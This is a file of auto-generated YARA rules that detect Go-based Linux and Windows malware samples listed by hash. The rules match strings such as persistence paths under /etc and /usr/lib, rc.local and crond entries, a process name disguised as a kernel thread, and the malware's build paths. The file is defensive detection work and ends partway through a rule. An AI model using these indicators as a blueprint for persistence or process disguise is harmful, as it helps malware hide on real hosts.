rule _0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b_36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a_45 {
   meta:
      description = "_subset_batch - from files 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash2 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash3 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
   strings:
      $x1 = "invalid hostname: /dev/misc/watchdogreceived from peerframe_goaway_shortproxy-authenticateUNKNOWN_SETTING_%dGo-http-client/2.0Go" ascii /* score: '51.00'*/
      $x2 = "abiRegArgsType needs GC Prog, update methodValueCallFrameObjsexec: Cmd started a Process but leaked without a call to Waitx509: " ascii /* score: '50.50'*/
      $x3 = "stopm spinning nmidlelocked= needspinning=store64 failedsemaRoot queuebad allocCountbad span statestack overflow untyped args  o" ascii /* score: '35.00'*/
      $s4 = ": TLS [http2: client conn not usablehttp: idle connection timeoutinternal error: took too muchframe_pushpromise_zero_streamframe" ascii /* score: '30.00'*/
      $s5 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '22.00'*/
      $s6 = "ith invalid signature algorithm -- obsoleteuconn.Extensions contains %v separate SupportedVersions extensionsruntime: unexpected" ascii /* score: '21.00'*/
      $s7 = ": write to broken pipeSIGPWR: power failure restartexecuting on Go runtime stackruntime: mmap: access denied" fullword ascii /* score: '21.00'*/
      $s8 = "sync.Mutex.Lockmalloc deadlockruntime error:   with GC prog" fullword ascii /* score: '19.00'*/
      $s9 = "ailer keywrite error: %wPKCS1WithSHA256PKCS1WithSHA384PKCS1WithSHA512ClientAuthType(unknown versionClientHello ID record overflo" ascii /* score: '18.00'*/
      $s10 = "thread_frame_eofContent-LengthNot AcceptableMAX_FRAME_SIZEPROTOCOL_ERRORINTERNAL_ERRORREFUSED_STREAMbad record MACinternal error" ascii /* score: '18.00'*/
      $s11 = "t-Languagequotaon.servicelibgdi.so.0.8.2invalid versionwrite rsp err: invalid ver/cmdaccept-encodingaccept-languagex-forwarded-f" ascii /* score: '18.00'*/
      $s12 = "n s.state=runtime: pipe failed with freedefer with d.fn != nilforEachP: P did not run fnwakep: negative nmspinningstartlockedm: " ascii /* score: '16.00'*/
      $s13 = "sage cannot contain multiple Content-Length headers; got %qgo package net: cgo resolver not supported; using Go's DNS resolver" fullword ascii /* score: '15.00'*/
      $s14 = "orrecv_rststream_Idempotency-KeyPartial ContentRequest TimeoutLength RequiredNot ImplementedGateway Timeoutunexpected typebad tr" ascii /* score: '14.00'*/
      $s15 = "wbad certificate476837158203125no such processnot a directoryadvertise errornetwork is downno medium foundkey has expiredbad sys" ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _08e72ab453af9c98b11ad8b304266ea0_imphash__3f26b33b312325e720d7b471536e1fec_imphash__46 {
   meta:
      description = "_subset_batch - from files 08e72ab453af9c98b11ad8b304266ea0(imphash).exe, 3f26b33b312325e720d7b471536e1fec(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7a311b584497e8133cd85950fec6132904dd5b02388a9feed3f5e057fb891d09"
      hash2 = "29fa4f667a1236d52330e1bd6cec2eacb9c1d3f3a321ba173bcac0a8e46f5d63"
   strings:
      $s1 = "_head_lib64_libapi_ms_win_crt_private_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s2 = "_head_lib64_libapi_ms_win_crt_runtime_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s3 = "__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s4 = ".rdata$.refptr.__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s5 = "_head_lib64_libapi_ms_win_crt_environment_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s6 = "_head_lib64_libapi_ms_win_crt_string_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s7 = "_head_lib64_libapi_ms_win_crt_time_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s8 = "__imp__get_output_format" fullword ascii /* score: '9.00'*/
      $s9 = "_head_lib64_libapi_ms_win_crt_stdio_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s10 = "_head_lib64_libapi_ms_win_crt_heap_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s11 = "_head_lib64_libapi_ms_win_crt_math_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s12 = ".refptr.__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11_47 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash3 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash4 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = " [failed to parse Location header %q: %vnet/http: invalid header field name %qtls: invalid ServerKeyExchange messageexpected an " ascii /* score: '66.50'*/
      $x2 = "sched={pc:, gp->status= pluginpath= : unknown pc  called from  in host nameSHA256-RSAPSSSHA384-RSAPSSSHA512-RSAPSStrailing dataS" ascii /* score: '51.00'*/
      $x3 = "morebuf={pc:: no frame (sp=runtime: frame runtimer: bad ptraceback stuckruntime.gopanicinvalid argSize<invalid Value>data before" ascii /* score: '31.00'*/
      $x4 = "runtime: sp=abi mismatchreflect.Copy/dev/urandomECDSA-SHA256ECDSA-SHA384ECDSA-SHA512SSL_CERT_DIR (no status)%!(BADWIDTH)randauto" ascii /* score: '31.00'*/
      $s5 = "stem.mark/etc/rc.d/init.dreading header: *http2.TransportWww-Authenticatecontent-encodingcontent-languagecontent-locationwww-aut" ascii /* score: '25.00'*/
      $s6 = "re dumped)unexpected EOFsingle-request/etc/protocolsunknown mode: userArenaStateread mem statsallocfreetracegcstoptheworldGC ass" ascii /* score: '24.00'*/
      $s7 = "pstime.Date(time.Local%!Weekday(short readreaddirent/dev/stdin/etc/hostsunixpacketnameservergetsockoptnetlinkribIP addresssetsoc" ascii /* score: '23.00'*/
      $s8 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '22.00'*/
      $s9 = "244140625ParseUintinterruptbus errorcontinuedWednesdaySeptember-07:00:00Z07:00:00localtimefork/execattempts:no-reloadfiles,dnsdn" ascii /* score: '21.00'*/
      $s10 = " with invalid signature algorithm -- obsoleteuconn.Extensions contains %v separate SupportedVersions extensionsruntime: unexpect" ascii /* score: '21.00'*/
      $s11 = " unexpected overflowstream error: stream ID %d; %vframe_settings_ack_with_lengthillegal window increment valueHEADERS frame with" ascii /* score: '20.50'*/
      $s12 = "ize == 0/gc/cycles/total:gc-cyclesnegative idle mark workersuse of invalid sweepLockerruntime: bad span s.state=runtime: pipe fa" ascii /* score: '18.00'*/
      $s13 = "vel 2 haltedprotocol errortoo many userswindow changedtime.Location(: extra text: /etc/localtime.WithDeadline(<not Stringer> (co" ascii /* score: '18.00'*/
      $s14 = "thContent-Lengthread_frame_eofNot AcceptableMAX_FRAME_SIZEPROTOCOL_ERRORINTERNAL_ERRORREFUSED_STREAMbad record MACinternal error" ascii /* score: '18.00'*/
      $s15 = "henticateproxy-connectionread_frame_otherContent-Encoding%s %s HTTP/1.1" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _0512719a1f878b3611b03d100a854910_imphash__084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3_48 {
   meta:
      description = "_subset_batch - from files 0512719a1f878b3611b03d100a854910(imphash).exe, 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "418ec7ea2b11e518fea98992db9c087d4a38df8b4e9c52b55045d7cd0abdd9ac"
      hash2 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash3 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash4 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash5 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash6 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash7 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash8 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
      hash9 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash10 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.hashGrow" fullword ascii /* score: '13.00'*/
      $s8 = "tophash" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.traceGoUnpark" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.traceProcStop" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.traceGCStart" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.traceGoStart" fullword ascii /* score: '10.00'*/
      $s13 = "sync.runtime_doSpin" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fastrand" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.traceGoCreate" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d_37c14ac6942e05caf18340201ab76c17220d446104349ec45_49 {
   meta:
      description = "_subset_batch - from files 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash2 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
   strings:
      $x1 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '65.50'*/
      $x2 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '57.50'*/
      $x3 = "/etc/profile.d/bash.cfg/usr/lib/libgdi.so.0.8.2 { proc_name=$(/usr/bin/unexpected buffer len=%vinvalid pseudo-header %qframe_hea" ascii /* score: '46.00'*/
      $x4 = "stack not a power of 2minpc or maxpc invalidtrace: alloc too largenon-Go function at pc=unexpected method stepreflect.Value.MapI" ascii /* score: '38.00'*/
      $x5 = " ptrSize=  targetpc= until pc=unknown pcruntime: ggoroutine execerrdotcomplex128t.Kind == SHA256-RSASHA384-RSASHA512-RSADSA-SHA2" ascii /* score: '35.50'*/
      $x6 = "stopm spinning nmidlelocked= needspinning=store64 failedmemprofileratesemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x7 = "/etc/init.d/boot.localIPv6: no supported yethttp2: frame too largewrite on closed bufferframe_data_pad_too_bigaccess-control-max" ascii /* score: '32.00'*/
      $s8 = "ProcessingNo ContentRST_STREAMEND_STREAMresumptionres binderres masterexp master12207031256103515625owner diedterminated/setgrou" ascii /* score: '30.00'*/
      $s9 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"len(x) != len(z" ascii /* score: '28.00'*/
      $s10 = ": TLS [http2: client conn not usablehttp: idle connection timeoutinternal error: took too muchframe_pushpromise_zero_streamframe" ascii /* score: '25.00'*/
      $s11 = "32nan3GOTRACEBACK) at entry+ (targetpc= , plugin: runtime: g : frame.sp=created by bad argSizemethodargs(reflect.Setbad opcode w" ascii /* score: '24.00'*/
      $s12 = "pected messageexport restrictionvalue out of range298023223876953125input/output errorno child processesidentifier removedno loc" ascii /* score: '21.00'*/
      $s13 = "known networkwrite heap dumpasyncpreemptoffforce gc (idle)sync.Mutex.Lockmalloc deadlockruntime error:   with GC prog" fullword ascii /* score: '21.00'*/
      $s14 = "ject at *( in prepareForSweep; sweepgen /cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sync/mutex/wait/total:secon" ascii /* score: '20.00'*/
      $s15 = "out of range [%x:]SIGSEGV: segmentation violationinternal error - misuse of itab) not in usable address space: runtime: cannot a" ascii /* score: '19.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_50 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash4 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash5 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "net/url: invalid control character in URLcan't call pointer on a non-pointer Valuereflect.Value.Addr of unaddressable valueMapIt" ascii /* score: '41.50'*/
      $x2 = "error in parseTagAndLengthmix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLengt" ascii /* score: '36.50'*/
      $x3 = "os/exec.Command(exec: killing Cmdexec: not startedunknown type kindreflect.Value.Intreflect: call of reflect.Value.Lenreflect: N" ascii /* score: '32.00'*/
      $x4 = "key is not comparablesingle-request-reopenparsenetlinkrouteattrnegative shift amountconcurrent map writes/gc/heap/allocs:bytesru" ascii /* score: '31.00'*/
      $s5 = "er error/usr/bin/find/usr/bin/lsof/etc/rc.localcrond.service[ksoftirqd/0]read header: /dev/watchdogAuthorization[FrameHeader acc" ascii /* score: '24.00'*/
      $s6 = "ta corruptionexec: already startedreflect.Value.Complex of unexported methodunexpected value stepreflect.Value.Pointerreflect.Va" ascii /* score: '22.00'*/
      $s7 = "os/exec.Command(exec: killing Cmdexec: not startedunknown type kindreflect.Value.Intreflect: call of reflect.Value.Lenreflect: N" ascii /* score: '20.00'*/
      $s8 = "ed -e '/http2: no cached connection was availablehttp2: invalid Upgrade request header: %qtls: internal error: unsupported key (" ascii /* score: '19.00'*/
      $s9 = "rder or overlappingmheap.freeSpanLocked - invalid stack freemheap.freeSpanLocked - invalid span stateattempted to add zero-sized" ascii /* score: '19.00'*/
      $s10 = "lue.SetUintunsupported operationinvalid NumericStringx509: invalid versionwebsocket: close sentSec-WebSocket-VersionSec-Websocke" ascii /* score: '18.00'*/
      $s11 = "md/system/quotaon.servicehttp: putIdleConn: keep alives disabledinvalid HTTP header value for header %qtls: unsupported certific" ascii /* score: '18.00'*/
      $s12 = " address rangeruntime: blocked read on closing polldescstopTheWorld: not stopped (stopwait != 0) closed, unable to open /dev/nul" ascii /* score: '17.00'*/
      $s13 = "ntime: casfrom_Gscanstatus failed gp=stack growth not allowed in system calltraceback: unexpected SPWRITE function exec: environ" ascii /* score: '16.00'*/
      $s14 = "%T)invalid value length: expected %d, got %duTLS does not support 0x%X as min versionuTLS does not support 0x%X as max versionat" ascii /* score: '15.50'*/
      $s15 = "02 15:04:05.999999999 -0700 MSTinternal error: exit hook invoked panicmismatched count during itab table copyout of memory alloc" ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_51 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash4 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash5 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash6 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $s1 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/spoof.go" fullword ascii /* score: '17.00'*/
      $s2 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/getrand.go" fullword ascii /* score: '17.00'*/
      $s3 = "127.0.0.1:53no such hostunknown portinvalid portsweepWaiterstraceStringsspanSetSpinemspanSpecialgcBitsArenasmheapSpecialgcpacert" ascii /* score: '17.00'*/
      $s4 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/sha3/sha3.go" fullword ascii /* score: '15.00'*/
      $s5 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/sha3/shake.go" fullword ascii /* score: '15.00'*/
      $s6 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/sha3/hashes.go" fullword ascii /* score: '15.00'*/
      $s7 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/sha3/register.go" fullword ascii /* score: '15.00'*/
      $s8 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/http.go" fullword ascii /* score: '15.00'*/
      $s9 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/curve25519/curve25519.go" fullword ascii /* score: '15.00'*/
      $s10 = "C:/Users/Administrator/go/pkg/mod/golang.org/x/crypto@v0.12.0/curve25519/curve25519_go120.go" fullword ascii /* score: '15.00'*/
      $s11 = "ept-rangesauthorizationcache-controlcontent-rangeif-none-matchlast-modifiedCache-ControlReset ContentLoop DetectedSTREAM_CLOSEDC" ascii /* score: '13.00'*/
      $s12 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/ini.go" fullword ascii /* score: '12.00'*/
      $s13 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/init.go" fullword ascii /* score: '12.00'*/
      $s14 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/ws.go" fullword ascii /* score: '12.00'*/
      $s15 = "C:/Users/Administrator/Desktop/GGGG-55555/Client/util.go" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1dbc7738d8ad1e6b79048c0e4a9066ae_imphash__799e73863806df2964d80d12ce4e61ea_imphash__52 {
   meta:
      description = "_subset_batch - from files 1dbc7738d8ad1e6b79048c0e4a9066ae(imphash).exe, 799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fb488e45a6338697d70301557cad14b110880f6838023b44d0125759123c4449"
      hash2 = "9bab404584f6a0d9d82112d6e017cfa37d0094d97e510101d6a0132fd145dd32"
   strings:
      $s1 = "GetKeyHashCode@" fullword ascii /* score: '15.00'*/
      $s2 = "FreeLibrary4GetFileAttributesExPrivate" fullword ascii /* score: '12.00'*/
      $s3 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s4 = " GetValueHashCode@" fullword ascii /* score: '12.00'*/
      $s5 = ",TryGetThunkDataAddress" fullword ascii /* score: '12.00'*/
      $s6 = "System.Numerics.INumberBase<System.Int32>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s7 = "System.Numerics.INumberBase<System.Int32>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s8 = ">InitializeComForFinalizerThread@InitializeComForThreadPoolThread" fullword ascii /* score: '10.00'*/
      $s9 = "4TryGetMetadataForNamedType" fullword ascii /* score: '9.00'*/
      $s10 = "get_LongTimes@" fullword ascii /* score: '9.00'*/
      $s11 = "GetNextChar@" fullword ascii /* score: '9.00'*/
      $s12 = "get_Position@" fullword ascii /* score: '9.00'*/
      $s13 = "BDrainRemainingDataForGetByteCount,ThrowLastCharRecursive@" fullword ascii /* score: '9.00'*/
      $s14 = "GetOrAdd@" fullword ascii /* score: '9.00'*/
      $s15 = "\"get_FinalizerCode.get_NullableValueOffset@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f27_53 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash3 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash4 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash5 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $x1 = "span set block with unpopped elements found in resetcasfrom_Gscanstatus: gp->status is not in scan stateerrors: *target must be " ascii /* score: '67.50'*/
      $x2 = "mix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLength=%d with Body length %d b" ascii /* score: '44.50'*/
      $x3 = "stopTheWorld: not stopped (status != _Pgcstop)select on synctest channel from outside bubbleruntime: name offset base pointer ou" ascii /* score: '43.00'*/
      $x4 = "mix of request and response pseudo headersPRIORITY frame payload size was %d; want 5http: ContentLength=%d with Body length %d b" ascii /* score: '36.50'*/
      $s5 = " child processesfile name too longno locks availableidentifier removedmultihop attemptedRFS specific errorstreams pipe erroroper" ascii /* score: '28.00'*/
      $s6 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s7 = "ensiontls: server sent a cookie in a normal ServerHello (Client.Timeout exceeded while awaiting headers)net/http: Transport.Dial" ascii /* score: '23.00'*/
      $s8 = "ow10x509: X25519 key encoded with illegal parametersx509: SAN uniformResourceIdentifier is malformedx509: IP constraint containe" ascii /* score: '22.00'*/
      $s9 = "cookieexpectoriginExpectPragmasocks LockedreadatTMPDIRremovewaitidexec: sysmontimersefenceselect, not GOROOT next= jobs= goid sw" ascii /* score: '22.00'*/
      $s10 = "%x] with capacity %yruntime: cannot map pages in arena address spaceruntime: malformed profBuf buffer - invalid sizeattempt to t" ascii /* score: '21.00'*/
      $s11 = "to at least one field of zeroserror when reading %s headers: %w. Buffer size=%dcrypto/rsa: public exponent too small or negative" ascii /* score: '21.00'*/
      $s12 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s13 = "me.m memory alignment too small for spinbit mutexmin size of malloc header is not a size class boundarygcControllerState.findRun" ascii /* score: '19.00'*/
      $s14 = "k in too many shared librariesx509: malformed public key algorithm identifierx509: internal error: IP SAN %x failed to parsechac" ascii /* score: '19.00'*/
      $s15 = "morywirep: already in goApple Computer, Inc.X-Azure-RequestChain_hjSessionUser_%s=%sinvalid request codebad font file formatconn" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_54 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash4 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
   strings:
      $x1 = "stop of synctest timer from outside bubbletraceStopReadCPU called with trace enabledattempted to trace a bad status for a procTi" ascii /* score: '64.50'*/
